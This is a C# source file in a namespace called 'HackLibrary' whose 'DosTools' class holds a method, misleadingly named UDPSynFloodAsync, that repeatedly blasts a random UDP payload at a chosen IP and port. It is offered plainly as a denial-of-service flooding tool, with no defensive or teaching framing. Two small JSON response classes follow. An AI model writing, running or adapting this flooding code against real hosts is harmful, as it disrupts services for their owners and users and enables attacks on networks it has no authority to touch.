using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Xceed.Wpf.Toolkit;

namespace HackLibrary
{
    public static class DosTools { 

        public static string UDPSynFloodAsync(int packets, string IP, int port, int count)
        {
            try
            {
                Random rg = new Random();
                UdpClient udpClient = new UdpClient();
                byte[] packetData = Encoding.ASCII.GetBytes(string.Concat(Enumerable.Repeat(rg.Next(1,9), packets)));
                rg.NextBytes(packetData);

                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(IP), port);
                
                for (int i = 1; i <= count; i++)
                {
                    try
                    {
                        udpClient.Send(packetData, packetData.Length, IP, port);
                    }
                    catch (Exception e)
                    {
                        return $"Remote host closed connection: {e.Message}";
                    }
                }
                

                return $"Sent {packets} packets to {IP}:{port} {count} times";
            }
            catch (Exception ex)
            {
                return $"There was an error trying to send packets: {ex.Message}";
            }
        }
    }
    public class Data
    {
        public string length { get; set; }
        public string type { get; set; }
        public string formatted { get; set; }
    }

    public class Root3
    {
        public string success { get; set; }
        public string message { get; set; }
        public Data data { get; set; }
    }
}
